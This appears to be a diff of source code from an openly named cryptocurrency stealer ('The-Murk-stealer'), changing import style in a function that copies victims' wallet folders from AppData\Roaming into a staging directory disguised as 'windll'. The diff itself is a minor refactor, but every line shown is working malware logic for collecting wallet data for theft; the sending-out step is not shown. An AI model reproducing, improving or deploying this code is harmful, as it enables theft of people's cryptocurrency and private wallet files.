@@ -10,16 +10,16 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
-import shutil
+from os import environ,sep
+from shutil import copytree
 
 
 def Wallets(data):
     try:
         data.append("\n\n💰Wallets")
         print("w")
-        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
-        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Roaming'
+        pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
         """
         all needed paths
         """
@@ -55,12 +55,12 @@ def Wallets(data):
                 try:
                     if (i != 3 and i != 7 and i != 8):
                         #print(wallets[i],"  if")
-                        shutil.copytree(rf"{pathtofile}{wallets[i]}",rf"{pathtofolder}\windll\wallets{wallets[i]}")# copy dirs
+                        copytree(rf"{pathtofile}{wallets[i]}",rf"{pathtofolder}\windll\wallets{wallets[i]}")# copy dirs
                     else:
                         #print(wallets[i],"  else")
                         num = wallets[i].rfind("\\")
                         #print(wallets[i][:num+1])
-                        shutil.copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}")# copy dirs
+                        copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}")# copy dirs
                     data.append(f"\n∟{walletsNames[i]}")
                 except Exception as e:
                     print(e)
